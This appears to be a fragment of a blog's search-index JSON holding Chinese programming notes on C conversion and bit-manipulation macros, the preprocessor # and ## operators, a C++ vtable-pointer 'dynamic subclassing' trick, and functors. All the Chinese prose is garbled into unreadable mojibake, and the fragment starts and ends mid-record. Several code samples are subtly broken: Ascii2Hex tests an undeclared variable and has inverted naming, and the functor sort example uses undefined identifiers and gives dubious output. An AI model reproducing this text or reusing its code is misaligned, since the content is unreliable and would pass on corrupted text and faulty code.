1ã€æŠŠAsciiå­—ç¬¦è½¬16è¿›åˆ¶ 1234567891011121314151617181920212223/***************************å‡½æ•°å:Ascii2HexåŠŸèƒ½æè¿°:æŠŠAsciiå­—ç¬¦è½¬16è¿›åˆ¶å‚æ•°ï¼šAsciiå­—ç¬¦è¿”å›ï¼š16è¿›åˆ¶***************************/unsigned char Ascii2Hex( unsigned char bAscii ) &#123; unsigned char bHex = 0; if( ( bAscii &gt;= 0 ) &amp;&amp; ( bChar &lt;= 9 ) ) &#123; bHex = bAscii + 0x30; &#125; else if( ( bAscii &gt;= 10 ) &amp;&amp; ( bAscii &lt;= 15 ) ) &#123; bHex = bAscii + 0x37; &#125; else &#123; bHex = 0xff; &#125; return bHex;&#125; 2ã€æŠŠ16è¿›åˆ¶è½¬Asciiå­—ç¬¦ 123456789101112131415161718192021222324252627/***************************å‡½æ•°å:Hex2AsciiåŠŸèƒ½æè¿°:æŠŠ16è¿›åˆ¶è½¬Asciiå­—ç¬¦å‚æ•°ï¼š16è¿›åˆ¶è¿”å›ï¼šAsciiå­—ç¬¦***************************/unsigned char Hex2Ascii( unsigned char bHex ) &#123; unsigned char bAscii = 0; if( ( bHex &gt;= &#x27;0&#x27; ) &amp;&amp; ( bHex &lt;= &#x27;9&#x27; ) ) &#123; bAscii = bHex - &#x27;0&#x27;; &#125; else if( ( bHex &gt;= &#x27;A&#x27; ) &amp;&amp; ( bHex &lt;= &#x27;F&#x27; ) ) &#123; bAscii = bHex - &#x27;7&#x27;; &#125; else if( ( bHex &gt;= &#x27;a&#x27; ) &amp;&amp; ( bHex &lt;= &#x27;f&#x27; ) ) &#123; bAscii = bHex - 0x57; &#125; else &#123; bAscii = 0xff; &#125; return bAscii;&#125; 3ã€æŠŠ16è¿›åˆ¶è½¬BCDå€¼ 12345678910/***************************å‡½æ•°å:Hex2BcdåŠŸèƒ½æè¿°:æŠŠ16è¿›åˆ¶è½¬BCDå€¼å‚æ•°ï¼š16è¿›åˆ¶å€¼è¿”å›ï¼šBCDå€¼***************************/u_8 Hex2Bcd( u_8 HexCode )&#123; return( ( HexCode % 10 ) + ( HexCode / 10 * 16 ) );&#125; 4ã€æŠŠBCDå€¼è½¬2è¿›åˆ¶ 12345678910/***************************å‡½æ•°å:Bcd2BinåŠŸèƒ½æè¿°:æŠŠBCDå€¼è½¬2è¿›åˆ¶å‚æ•°ï¼šBCDå€¼è¿”å›ï¼š2è¿›åˆ¶å€¼***************************/u_8 Bcd2Bin( u_8 BcdCode )&#123; return( ( ( ( BcdCode &gt;&gt; 4 ) &amp; 0x0F ) * 10 ) + ( BcdCode &amp; 0x0F )); &#125; 5ã€æŠŠ2è¿›åˆ¶è½¬BCDå€¼ 12345678910/***************************å‡½æ•°å:Bin2BCDåŠŸèƒ½æè¿°:æŠŠ2è¿›åˆ¶è½¬BCDå€¼å‚æ•°ï¼š2è¿›åˆ¶å€¼è¿”å›ï¼šBCDå€¼***************************/u_8 Bin2BCD( u_8 BinCode )&#123; return( ( ( (BinCode)/10 ) &lt;&lt; 4 ) + ( (BinCode) %10 )); &#125; 6ã€æŠŠxå€¼çš„ç¬¬iä½ç½®ä¸º1 12/********æŠŠxå€¼çš„ç¬¬iä½ç½®ä¸º1*************/#define X_SETBIT( x , i ) ( (x) |= ( 0x1 &lt;&lt; (i) )) 7ã€æŠŠxå€¼çš„ç¬¬iä½æ¸…ä¸º0 12/**********æŠŠxå€¼çš„ç¬¬iä½æ¸…ä¸º0**********/#define X_CLRBIT( x , i ) ( (x) &amp;= ( ~( 0x01 &lt;&lt; (i) ))) 8ã€åˆ¤æ–­xå€¼çš„ç¬¬iä½æ˜¯å¦ä¸º1 12/*********åˆ¤æ–­xå€¼çš„ç¬¬iä½æ˜¯å¦ä¸º1**********/#define X_CHKBIT( x , i ) ( ((x) &gt;&gt; (i) ) &amp; 0x01 ) 9ã€x,yå€¼ä¸­çš„æœ€å°å€¼ 12/*********x,yå€¼ä¸­çš„æœ€å°å€¼**********/#define X_MIN( x ,y ) (((x)&gt;(y))?(y):(x)) 10ã€x,yå€¼ä¸­çš„æœ€å¤§å€¼ 12/*********x,yå€¼ä¸­çš„æœ€å¤§å€¼**********/#define X_MAX( x ,y ) (((x)&gt;(y))?(x):(y)) 11ã€å–iå€¼çš„ä½8ä½ 12/*********å–iå€¼çš„ä½8ä½**********/#define GET_4_BYTE(i) (u_8)( ( (i) &amp; 0xFF ) &gt;&gt; 0 ) 12ã€å–iå€¼çš„8-16ä½ 12/*********å–iå€¼çš„8-16ä½**********/#define GET_3_BYTE(i) (u_8)( ( (i) &amp; 0xFF00 ) &gt;&gt; 8 ) 13ã€å–iå€¼çš„16-24ä½ 12/*********å–iå€¼çš„16-24ä½**********/#define GET_2_BYTE(i) (u_8)( ( (i) &amp; 0xFF0000 ) &gt;&gt; 16 ) 14ã€å–iå€¼çš„24-32ä½ 12/*********å–iå€¼çš„24-32ä½**********/#define GET_1_BYTE(i) (u_8)( ( (i) &amp; 0xFF000000 ) &gt;&gt; 24 ) 15ã€4ä¸ªå­—èŠ‚ä¸ºintå‹å˜é‡ 12/*********4ä¸ªå­—èŠ‚ä¸ºintå‹å˜é‡**********/#define BYTE_TO_INT( byte,byte1,byte2,byte3 ) ( (byte&lt;&lt;24) | (byte1 &lt;&lt; 16) | (byte2 &lt;&lt; 8) | byte3 ) 16ã€2ä¸ªå­—èŠ‚ä¸ºshortå‹å˜é‡ 12/*********2ä¸ªå­—èŠ‚ä¸ºshortå‹å˜é‡**********/#define BYTE_TO_SHORT( byte ,byte1) ( (byte&lt;&lt;8) | byte1 ) 17ã€intå‹å˜é‡ä¸º4ä¸ªå­—èŠ‚ 123456/*********intå‹å˜é‡ä¸º4ä¸ªå­—èŠ‚**********/#define INT_TO_BYTE( Val,byte ) do&#123; (byte)[0] = ((Val)&gt;&gt;24)&amp;0xff;\\ (byte)[1] = ((Val)&gt;&gt;16)&amp;0xff;\\ (byte)[2] = ((Val)&gt;&gt;8)&amp;0xff;\\ (byte)[3] = ((Val))&amp;0xff;\\ &#125;while(0) 18ã€shortå‹å˜é‡ä¸º2ä¸ªå­—èŠ‚ 1234/*********shortå‹å˜é‡ä¸º2ä¸ªå­—èŠ‚**********/#define SHORT_TO_BYTE( Val ,byte) do&#123; (byte)[0] = ((Val)&gt;&gt;8)&amp;0xff;\\ (byte)[1] = (Val)&amp;0xff;\\ &#125;while(0) 19ã€æ ‡å‡†æ—¶é—´timeè½¬æ¢å­—ç¬¦ä¸²è¾“å‡º 123456/*********æ ‡å‡†æ—¶é—´timeè½¬æ¢å­—ç¬¦ä¸²è¾“å‡º**********/#define TIME_2_STR(t, str) do&#123; tm_t tmtime;\\ gmtime_r( (time_t *)&amp;t,&amp;tmtime );\\ sprintf(str,&quot;%04d-%02d-%02d %02d:%02d:%02d&quot;,1900 + tmtime.tm_year, tmtime.tm_mon + 1, \\ tmtime.tm_mday,tmtime.tm_hour, tmtime.tm_min, tmtime.tm_sec);\\ &#125;while(0) 20ã€IPå€¼è½¬æ¢IPå­—ç¬¦ä¸²è¾“å‡º 12345/*********IPå€¼è½¬æ¢IPå­—ç¬¦ä¸²è¾“å‡º**********/#define IPADDR_2_STR(lIp, str) do&#123; u_8 ipaddr[4];\\ memcpy (&amp;(ipaddr[0]), &amp;(lIp), 4);\\ sprintf(str,&quot;%03d.%03d.%03d.%03d&quot;,ipaddr[0],ipaddr[1],ipaddr[2],ipaddr[3]);\\ &#125;while(0) ä¸€ã€å­—ç¬¦ä¸²åŒ–æ“ä½œç¬¦# # çš„åŠŸèƒ½ï¼šå°†#åé¢çš„å®å‚æ•°è½¬åŒ–æˆå­—ç¬¦ä¸²ã€‚ ä½¿ç”¨æ¡ä»¶ï¼šåªèƒ½ç”¨äºæœ‰ä¼ å…¥å‚æ•°çš„å®å®šä¹‰ä¸­ï¼Œä¸”#å¿…é¡»ç½®äºå®å®šä¹‰ä½“ä¸­çš„å‚æ•°åå‰ã€‚ 123456789#include&lt;stdio.h&gt;// sæ˜¯å®å‚æ•°#define Str(s) #s //åŠŸèƒ½ï¼šä½¿ç”¨Str(s)å°†sè½¬åŒ–ä¸ºå­—ç¬¦ä¸²int main()&#123; printf(Str(HelloWorld)); return;&#125;//è¾“å‡ºï¼šHelloWorld 3.å¯¹ç©ºæ ¼çš„å¤„ç† 123#define example1(instr) #instrstringstr=example1(abc)ï¼› å°†ä¼šå±•æˆï¼šstring str=&quot;abc&quot;ï¼› ğŸ¥ aã€å¿½ç•¥ä¼ å…¥å‚æ•°åå‰é¢å’Œåé¢çš„ç©ºæ ¼ã€‚ 1å¦‚ï¼šstr=example1( abc )ï¼› å°†ä¼šè¢«æ‰©å±•æˆ str=&quot;abc&quot;ï¼› ğŸ¥ bã€å½“ä¼ å…¥å‚æ•°åé—´å­˜åœ¨ç©ºæ ¼æ—¶ï¼Œç¼–è¯‘å™¨å°†è‡ªåŠ¨è¿æ¥å„ä¸ªå­å­—ç¬¦ä¸²ï¼Œç”¨æ¯ä¸ªå­å­—ç¬¦ä¸²ä¸­åªä¸€ä¸ªç©ºæ ¼è¿æ¥ï¼Œå¿½ç•¥å¤šä½™ä¸€ä¸ªç©ºæ ¼ã€‚ 1å¦‚ï¼šstr=exapme1( abc def ); å°†ä¼šè¢«æ‰©å±•æˆ str=&quot;abc def&quot;ï¼› å®å®šä¹‰ä½œä¸ºå®å‚æ•°ï¼Œä¸å±•å¼€ï¼Œä»ç„¶ä½œä¸ºå­—ç¬¦ä¸²å­—é¢ä¿¡æ¯è¾“å‡ºã€‚ 1234567891011#include &lt;limits.h&gt;#include &lt;stdio.h&gt;#define STR(s) #s int main()&#123; // INT_MAXæ˜¯æŸä¸ªæ–‡ä»¶ä¸­å®šä¹‰çš„å®ï¼Œ printf(&quot;int max: %s\\n&quot;, STR(INT_MAX)); // è¾“å‡ºint max: INT_MAX return 0;&#125; äºŒã€ç¬¦å·è¿æ¥æ“ä½œç¬¦ ## ## çš„åŠŸèƒ½: å°†å‰åä¸¤ä¸ªæ ‡è¯†ç¬¦è¿æ¥å½¢æˆä¸€ä¸ªæ ‡è¯†ç¬¦ã€‚ ä½¿ç”¨æ¡ä»¶ï¼šåªèƒ½ç”¨äºæœ‰ä¼ å…¥å‚æ•°çš„å®å®šä¹‰ä¸­ï¼Œä¸”##å¿…é¡»ç½®äºå®å®šä¹‰ä½“ä¸­çš„å‚æ•°åå‰ã€‚ 12345678910#include&lt;stdio.h&gt;#define Var(x) var##xint main()&#123; int Var(1)=1,Var(2)=2,Var(3)=3; printf(&quot;var1=%d\\n&quot;,var1); printf(&quot;var2=%d\\n&quot;,var2); printf(&quot;var3=%d\\n&quot;,var3); return 0;&#125; 3.æ³¨æ„ aã€å½“ç”¨##è¿æ¥å½¢å‚æ—¶ï¼Œ##å‰åçš„ç©ºæ ¼å¯æœ‰å¯æ— ã€‚ å¦‚ï¼š#define exampleNum(n) num ## n ç›¸å½“äº #define exampleNum(n) num##n bã€è¿æ¥åçš„å®é™…å‚æ•°åï¼Œå¿…é¡»ä¸ºå®é™…å­˜åœ¨çš„å‚æ•°åæˆ–æ˜¯ç¼–è¯‘å™¨å·²çŸ¥çš„å®å®šä¹‰ã€‚è¿æ¥ä¹‹ååªæ˜¯ç»„æˆäº†ä¸€ä¸ªå‚æ•°åï¼Œå¹¶æ²¡æœ‰å®šä¹‰ï¼Œå› æ­¤è¦æ±‚è¿™ä¸ªå‚æ•°åéœ€è¦æ˜¯å·²ç»å­˜åœ¨æˆ–è€…è¯´å·²ç»è¢«å®šä¹‰äº†çš„å‚æ•°æˆ–å®å®šä¹‰ã€‚ cã€å½“å®å‚æ•°æ˜¯å¦ä¸€ä¸ªå®æ—¶ï¼Œå‡¡å®å®šä¹‰ä¸­å­˜åœ¨#æˆ–##çš„åœ°æ–¹ï¼Œå®å‚æ•°ä¸ä¼šå†å±•å¼€ã€‚ ï¼ˆ åªæœ‰å½“å‰å®ç”Ÿæ•ˆ, å‚æ•°é‡Œçš„å®ï¼ä¸ä¼šç”Ÿæ•ˆ ï¼ï¼‰ â‘  å®å®šä¹‰ä¸å­˜åœ¨â€™#â€˜å’Œâ€™##'çš„æƒ…å†µ 123456#define TOW (2) #define MUL(a,b) (a*b) printf(&quot;%d*%d=%d/n&quot;, TOW, TOW, MUL(TOW,TOW)); è¿™è¡Œçš„å®ä¼šè¢«å±•å¼€ä¸ºï¼š printf(&quot;%d*%d=%d/n&quot;, (2), (2), ((2)*(2))); MULé‡Œçš„å‚æ•°TOWä¼šè¢«å±•å¼€ä¸º(2). â‘¡ å®å®šä¹‰å­˜åœ¨â€™#â€˜æˆ–â€™##'çš„æ—¶å€™ï¼ˆ#åœ¨ä¸Šæ–¹æœ‰è®²è§£ï¼‰ 12345678910111213141516171819202122232425262728#include &lt;limits.h&gt;#include &lt;stdio.h&gt; #define A 2 #define CONS(a,b) (int)(a##e##b) //psï¼š##æ”¾åˆ°å®å‚æ•°åé¢ç›¸å½“äºä¸€ä¸ªè¿æ¥ æ— å…¶ä»–ä½œç”¨int main()&#123; // ç”±äºAæ˜¯å®ï¼Œä¸”ä½œä¸ºå®CONSçš„å‚æ•°ï¼Œå¹¶ä¸”å®CONS##ç¬¦å·ï¼Œæ‰€ä»¥Aä¸èƒ½è¢«è§£å¼•ç”¨ï¼Œå› æ­¤ä¸Šæ–¹ç¨‹åºç¼–è¯‘æŠ¥é”™ã€‚ printf(&quot;%d\\n&quot;, CONS(A, A)); // compile error æ— æ³•å±•å¼€ //printf(&quot;%d\\n&quot;, (int)(AeA)); return 0;&#125;// æŠ¥é”™ä¿¡æ¯å¦‚ä¸‹ï¼šmain.c: In function â€˜mainâ€™:main.c:8:22: error: â€˜AeAâ€™ undeclared (first use in this function) 8 | printf(&quot;%d\\n&quot;, CONS(A, A)); // compile error æ— æ³•å±•å¼€ | ^main.c:5:26: note: in definition of macro â€˜CONSâ€™ 5 | #define CONS(a,b) (int)(a##e##b) //psï¼š##æ”¾åˆ°å®å‚æ•°åé¢ç›¸å½“äºä¸€ä¸ªè¿æ¥ æ— å…¶ä»–ä½œç”¨ | ^main.c:8:22: note: each undeclared identifier is reported only once for each function it appears in 8 | printf(&quot;%d\\n&quot;, CONS(A, A)); // compile error æ— æ³•å±•å¼€ | ^main.c:5:26: note: in definition of macro â€˜CONSâ€™ 5 | #define CONS(a,b) (int)(a##e##b) //psï¼š##æ”¾åˆ°å®å‚æ•°åé¢ç›¸å½“äºä¸€ä¸ªè¿æ¥ æ— å…¶ä»–ä½œç”¨ | ^","tags":[{"name":"Code/å®å®šä¹‰","slug":"Code-å®å®šä¹‰","permalink":"https://hodlyounger.github.io/tags/Code-%E5%AE%8F%E5%AE%9A%E4%B9%89/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"https://hodlyounger.github.io/categories/B-Code/"},{"name":"CPP","slug":"B-Code/CPP","permalink":"https://hodlyounger.github.io/categories/B-Code/CPP/"}]},{"title":"ã€CPPã€‘åŠ¨æ€å£°æ˜å­ç±»","date":"2023-10-27T01:24:02.108Z","path":"B_Code/CPP/ã€CPPã€‘åŠ¨æ€å£°æ˜å­ç±»/","text":"1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071#include &lt;iostream&gt;#include &lt;cstdlib&gt;using namespace std;class BaseClass &#123;public: BaseClass() &#123; cout&lt;&lt;&quot;BaseClass Construct&quot;&lt;&lt;endl; &#125; virtual ~BaseClass() &#123; cout&lt;&lt;&quot;BaseClass Destruct&quot;&lt;&lt;endl; &#125; virtual void TestFunction() &#123; cout&lt;&lt;&quot;BaseClass TestFunction&quot;&lt;&lt;endl; &#125;protected: int Test;&#125;; class SonClass : public BaseClass&#123;public: SonClass() &#123; cout&lt;&lt;&quot;SonClass Construct&quot;&lt;&lt;endl; &#125; virtual ~SonClass() &#123; cout&lt;&lt;&quot;SonClass Destruct&quot;&lt;&lt;endl; &#125; virtual void TestFunction() &#123; cout&lt;&lt;&quot;SonClass TestFunction&quot;&lt;&lt;endl; &#125;&#125;; typedef void *LPVOID;template&lt;class _baseClass, class _derivedClass&gt;bool DoDynamicSubclassing(_baseClass *pBaseObj)&#123; if(pBaseObj) &#123; static_assert(sizeof(_baseClass) == sizeof(_derivedClass), &quot;DynamicSubclassing to _derivedClass must not have its own members&quot;); _derivedClass _derivedClassinstance; LPVOID *pBaseVirtPtr = (LPVOID*)pBaseObj, *pDerivedVirtPtr = (LPVOID*)&amp;_derivedClassinstance; //assign the virtual ptr of the derived class *pBaseVirtPtr = *pDerivedVirtPtr; return true; &#125; return false;&#125; int main()&#123; BaseClass *Test = new BaseClass; cout &lt;&lt; *(int*)Test &lt;&lt; endl; DoDynamicSubclassing&lt;BaseClass, SonClass&gt;(Test); Test-&gt;TestFunction(); cout &lt;&lt; *(int*)Test &lt;&lt; endl; cout &lt;&lt; &quot; â€”â€”â€”â€”â€”â€”â€”â€”- &quot; &lt;&lt;endl; BaseClass aaaa; cout &lt;&lt; *(int*)&amp;aaaa &lt;&lt; endl; DoDynamicSubclassing&lt;BaseClass, SonClass&gt;(&amp;aaaa); aaaa.TestFunction(); cout &lt;&lt; *(int*)&amp;aaaa &lt;&lt; endl; return 0;&#125;","tags":[{"name":"CPP","slug":"CPP","permalink":"https://hodlyounger.github.io/tags/CPP/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"https://hodlyounger.github.io/categories/B-Code/"},{"name":"CPP","slug":"B-Code/CPP","permalink":"https://hodlyounger.github.io/categories/B-Code/CPP/"}]},{"title":"ã€CPPã€‘ä»¿å‡½æ•°","date":"2023-10-27T01:24:02.107Z","path":"B_Code/CPP/ã€CPPã€‘ä»¿å‡½æ•°/","text":"æ¦‚è¿°ï¼š C++ é˜²å‡½æ•°ä½¿ç”¨å’Œè¯´æ˜ [toc] ä»¿å‡½æ•° é¡¾åæ€ä¹‰ï¼Œå°±æ˜¯&quot;ä»¿é€ å‡½æ•°&quot;çš„æ„æ€ï¼Œå®ƒå¹¶ä¸æ˜¯å‡½æ•°ï¼Œä½†æ˜¯å´æœ‰ç€ç±»ä¼¼äºå‡½æ•°çš„è¡Œä¸º. æˆ‘ä»¬åœ¨ç¼–ç¨‹çš„æ—¶å€™ï¼Œæœ‰æ—¶å€™ä¼šå‘ç°è¿™æ ·ä¸€ç§æƒ…å†µï¼šæœ‰ä¸€äº›ç›¸åŒçš„åŠŸèƒ½ï¼Œä¼šåœ¨ä¸åŒçš„æˆå‘˜å‡½æ•°ä¸­å‡ºç°. è¿™æ—¶å€™æŒ‰ç…§ä¸€èˆ¬çš„æŠ€å·§ï¼Œæˆ‘ä»¬ä¼šå°†è¿™äº›ç›¸åŒçš„åŠŸèƒ½ç‹¬ç«‹å‡ºæ¥è¿›è¡Œå°è£…. ä½†æ˜¯å†™ä¸€ä¸ªå…¬å…±å‡½æ•°çš„è¯ï¼Œå‡½æ•°ç”¨åˆ°çš„ä¸€äº›å˜é‡å°±å¯èƒ½è¢«è¿«æˆä¸ºå…¬å…±çš„å…¨å±€å˜é‡. è€Œä¸”ï¼Œä»…ä»…ä¸ºäº†å¤ç”¨è¿™ä¸€ç‰‡ä»£ç ï¼Œå°±è¦å•ç‹¬å†™ä¸€ä¸ªå‡½æ•°ï¼Œä¹Ÿä¸æ˜¯å¾ˆå¥½ç»´æŠ¤ï¼Œè¿™ä¸ªæ—¶å€™å°±å¯ä»¥ç”¨ä»¿å‡½æ•°äº†. æŒ‰ç…§ç™¾åº¦è¯æ¡çš„è¯´æ³•ï¼šå†™ä¸€ä¸ªç®€å•çš„ç±»ï¼Œé™¤äº†é‚£äº›ç»´æŠ¤ä¸€ä¸ªç±»çš„æˆå‘˜å‡½æ•°å¤–ï¼Œå°±åªæ˜¯å®ç°ä¸€ä¸ªoperator()ï¼Œåœ¨ç±»å®ä¾‹åŒ–çš„æ—¶å€™ï¼Œå°±å°†è¦ç”¨çš„ï¼Œéå‚æ•°çš„å…ƒç´ ä¼ å…¥ç±»ä¸­. è¿™æ ·å†™çš„å¥½å¤„æ˜¯ï¼š å…å»äº†ä¸€äº›å…¬å…±å˜é‡çš„å…¨å±€åŒ–çš„ç»´æŠ¤. å¯ä»¥ä½¿é‚£äº›ä»£ç ç‹¬ç«‹å‡ºæ¥ï¼Œä»¥ä¾¿ä¸‹æ¬¡å¤ç”¨. è¿™äº›ä»¿å‡½æ•°è¿˜å¯ä»¥ç”¨å…³è”ï¼Œèšåˆï¼Œä¾èµ–çš„ç±»ä¹‹é—´çš„å…³ç³»ï¼Œä¸ç”¨åˆ°ä»–ä»¬çš„ç±»ç»„åˆåœ¨ä¸€èµ·ï¼Œè¿™æ ·æœ‰åˆ©äºèµ„æºçš„ç®¡ç†. ä½œç”¨ï¼š å¯æ›¿ä»£å‡½æ•°æŒ‡é’ˆï¼Œä½¿ç”¨æ›´åŠ çµæ´» å¯å­˜å‚¨çŠ¶æ€ï¼Œå½¢æˆä¸€ç§ç±»ä¼¼äºé—­åŒ…çš„æœºåˆ¶ STL æä¾›çš„ä»¿å‡½æ•° graph LR A(STLæä¾›çš„ä»¿å‡½æ•°) --> B(ç®—æœ¯ç±»ä»¿å‡½æ•°) A --> C(å…³ç³»è¿ç®—ç¬¦ä»¿å‡½æ•°) A --> D(é€»è¾‘è¿ç®—ä»¿å‡½æ•°) A --> E(\"ä½è¿ç®—å‡½æ•°(since C++11)\") B --> B1(plus) --> ç›¸åŠ  B --> B2(minus) --> ç›¸å‡ B --> B3(multiplies) --> ç›¸ä¹˜ B --> B4(divides) --> ç›¸é™¤ B --> B5(modulus) --> å–æ¨¡ B --> B6(negate) --> å–å¦ C --> C1(equal_to) --> ç­‰äº C --> C2(not_equal_to) --> ä¸ç­‰äº C --> C3(greater) --> å¤§äº C --> C4(greater_equal) --> å¤§äºç­‰äº C --> C5(less) --> å°äº C --> C6(less_equal) --> å°äºç­‰äº D --> D1(logical_and) --> é€»è¾‘ä¸ D --> D2(logical_or) --> é€»è¾‘æˆ– D --> D3(logical_no) --> é€»è¾‘é E --> E1(bit_and) --> æŒ‰ä½ä¸ E --> E2(bit_or) --> æŒ‰ä½æˆ– E --> E3(bit_xor) --> æŒ‰ä½å¼‚æˆ– STL ä¸­ less&lt;T&gt; çš„ç”¨æ³•ç¤ºä¾‹ 123456789101112131415161718192021222324252627282930313233343536/* /home/muten003/CPP/functor/002.cpp*/#include &lt;iostream&gt;#include &lt;algorithm&gt;using namespace std; class MyClass&#123;public: int x; int y; friend bool operator&lt;(MyClass a, MyClass b);&#125;; class Compare&#123; friend bool operator&lt;(MyClass a, MyClass b) &#123; return a.x &lt; b.x; &#125;&#125;; int main()&#123; less&lt;MyClass&gt; myclassLes; MyClass myclass[3]; myclass[0].x = 2; myclass[1].x = 1; myclass[2].x = 3; sort(myclass, myclass + 2, myclassLes); for_each(sortClass, sortClass + 3, [] (UseLessClass obj) &#123; cout &lt;&lt; obj.y &lt;&lt; &quot;:&quot; &lt;&lt; obj.x &lt;&lt; endl; &#125;);&#125; è¾“å‡ºï¼š 11 2 3 ä½¿ç”¨ä»¿å‡½æ•°çš„ä¼˜ç‚¹ å°†ä¸€ä¸ªä¸ªåŠŸèƒ½é€šè¿‡ç±»æ¥å®ç°ï¼Œå¤§å¤šæ•°æƒ…å†µä¸‹ä¼šåŠ å¤§ä»£ç é‡. ä»¿å‡½æ•°ä¹Ÿæ˜¯å¦‚æ­¤ï¼Œä½†æ˜¯ä»¿å‡½æ•°å´æœ‰ç€è®¸å¤šä¼˜ç‚¹, é™¤äº†ä¸Šè¿°çš„æœ‰åˆ©äºèµ„æºç®¡ç†ã€æœ‰åˆ©äºä»£ç ç»´æŠ¤å¤–,è¿˜å…·æœ‰è¿™äº›ç‰¹ç‚¹ æ™ºèƒ½æ€§ï¼šä»¿å‡½æ•°æ˜¯é€šè¿‡ä»¿å‡½æ•°ç±»æ¥å®ç°çš„ï¼Œæ—¢ç„¶æ˜¯ç±»ï¼Œé‡Œé¢å°±å¯ä»¥å‚¨å­˜è®¸å¤šå˜é‡è¿˜æœ‰å…¶ä»–çš„ä¸€äº›ä¿¡æ¯.æˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸ªç‰¹å¾å®ç°è®¸å¤šçº¯çš„å‡½æ•°å®ç°ä¸äº†çš„åŠŸèƒ½ï¼Œä¸¾ä¸ªç®€å•çš„ä¾‹å­ï¼šæˆ‘è‹¥å†ä»¿å‡½æ•°ä¸­åŠ å…¥äº†ç»Ÿè®¡è°ƒç”¨å‡½æ•°æ¬¡æ•°çš„åŠŸèƒ½ã€‚é‚£ä¹ˆåœ¨æˆ‘ä½¿ç”¨ä»¿å‡½æ•°çš„æ—¶å€™ï¼Œå°±å¯ä»¥è‡ªåŠ¨å®ç°ç»Ÿè®¡æ¬¡æ•°çš„åŠŸèƒ½. æ‰€ä»¥è¯´ï¼Œæ›´åŠ æ™ºèƒ½ã€‚ çµæ´»æ€§ï¼šæˆ–è€…è¯´ï¼Œæ¯ä¸ªä»¿å‡½æ•°éƒ½å¯ä»¥æœ‰è‡ªå·±çš„ç±»å‹. ç”±äºä»¿å‡½æ•°æ˜¯æ³›å‹ç¼–ç¨‹çš„ä¸€ä¸ªä¾‹è¯, å®ƒå¯ä»¥ä»»æ„ æŒ‡å®šç±»å‹ã€‚ é€šå¸¸æ¯”ä¸€èˆ¬å‡½æ•°é€Ÿåº¦æ›´å¿«ï¼šå°¤å…¶æ˜¯å¤§é‡è°ƒç”¨å‡½æ•°çš„è¿‡ç¨‹ä¸­. æ¯”å¦‚è¯´ï¼šSTLæ’åºçš„æ—¶å€™,æ‰€éœ€è¦çš„é‚£ä¸ªæ’åºè§„åˆ™(ä¸ºä¸€ä¸ªboolå‹çš„å‡½æ•°). ä½¿ç”¨å®ä¾‹ ç®€å•ç¤ºä¾‹ 1234567891011121314151617181920212223242526272829#include &lt;iostream&gt;using namespace std;class Compare&#123;public: bool operator()(int a, int b) &#123; return a &lt; b; &#125;&#125;;template &lt;class Function&gt;void comp(int a, int b, Function func)&#123; if (func(a, b)) &#123; cout &lt;&lt; b &lt;&lt; &quot; is bigger than &quot; &lt;&lt; a &lt;&lt; endl; &#125; else &#123; cout &lt;&lt; a &lt;&lt; &quot; is bigger than &quot; &lt;&lt; b &lt;&lt; endl; &#125;&#125;int main()&#123; int a = 6; int b = 2; Compare com; comp(a, b, com);&#125; ä¸æ™®é€šå‡½æ•°å¯¹æ¯” 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748#include &lt;iostream&gt;#include &lt;set&gt;#include &lt;algorithm&gt;using namespace std;class CompareObject &#123;public: void operator()() &#123; cout &lt;&lt; &quot;ä»¿å‡½æ•°&quot; &lt;&lt; endl; &#125; // é‡è½½ void operator()(int number, int number2) &#123; cout &lt;&lt; &quot;ä»¿å‡½æ•°&quot; &lt;&lt; endl; &#125;&#125;;// æŸ¥çœ‹c++ for_eachæºç è‡ªå®šä¹‰class ShowActionObj &#123;public: void operator()(int content) &#123; cout &lt;&lt; &quot;custom ä»¿å‡½æ•°&quot; &lt;&lt; content &lt;&lt; endl; &#125;&#125;;// å›è°ƒæ–¹å¼void showAction(int content) &#123; cout &lt;&lt; &quot;custom æ™®é€šå‡½æ•°&quot; &lt;&lt; content &lt;&lt; endl;&#125;int main() &#123; // ç›´æ¥è°ƒç”¨ä»¿å‡½æ•° CompareObject fun1; fun1(); // ä»¥å›è°ƒæ–¹å¼è°ƒç”¨ set&lt;int&gt; setVar&#123; 10,20,30,40,50,60 &#125;; cout &lt;&lt; &quot;ä½¿ç”¨ä»¿å‡½æ•°:&quot; &lt;&lt; endl; for_each(setVar.begin(), setVar.end(), ShowActionObj()); cout &lt;&lt; &quot;ä½¿ç”¨æ™®é€šå‡½æ•°&quot; &lt;&lt; endl; for_each(setVar.begin(), setVar.end(), showAction); return 0;&#125; è¾“å‡ºå¦‚ä¸‹æ‰€ç¤ºï¼š 123456789101112131415ä»¿å‡½æ•°ä½¿ç”¨ä»¿å‡½æ•°:custom ä»¿å‡½æ•°10custom ä»¿å‡½æ•°20custom ä»¿å‡½æ•°30custom ä»¿å‡½æ•°40custom ä»¿å‡½æ•°50custom ä»¿å‡½æ•°60ä½¿ç”¨æ™®é€šå‡½æ•°custom æ™®é€šå‡½æ•°10custom æ™®é€šå‡½æ•°20custom æ™®é€šå‡½æ•°30custom æ™®é€šå‡½æ•°40custom æ™®é€šå‡½æ•°50custom æ™®é€šå‡½æ•°60 è¡¥å…… for_eace çš„æºç ï¼š 1234567891011template &lt;class _InIt, class _Fn&gt;_CONSTEXPR20 _Fn for_each(_InIt _First, _InIt _Last, _Fn _Func) &#123; // perform function for each element [_First, _Last) _Adl_verify_range(_First, _Last); auto _UFirst = _Get_unwrapped(_First); const auto _ULast = _Get_unwrapped(_Last); for (; _UFirst != _ULast; ++_UFirst) &#123; _Func(*_UFirst); &#125; return _Func;&#125; å‚è€ƒæ–‡ç«  Cä»¿å‡½æ•°_c ä»¿å‡½æ•°_æˆ‘è¦ç²¾é€šC++çš„åšå®¢-CSDNåšå®¢ C++ ä»¿å‡½æ•° - ç®€ä¹¦","tags":[],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"https://hodlyounger.github.io/categories/B-Code/"},{"name":"CPP","slug":"B-Code/CPP","permalink":"https://hodlyounger.github.io/categories/B-Code/CPP/"}]},{"title":"ã€CPPã€‘using ç”¨æ³•æ•´ç†","date":"2023-10-27T01:24:02.106Z","path":"B_Code/CPP/ã€CPPã€‘using/","text":"[toc] ç®€å•æ•´ç†ä¸€ä¸‹usingçš„ç”¨æ³• ä¸€ã€å‘½åç©ºé—´ 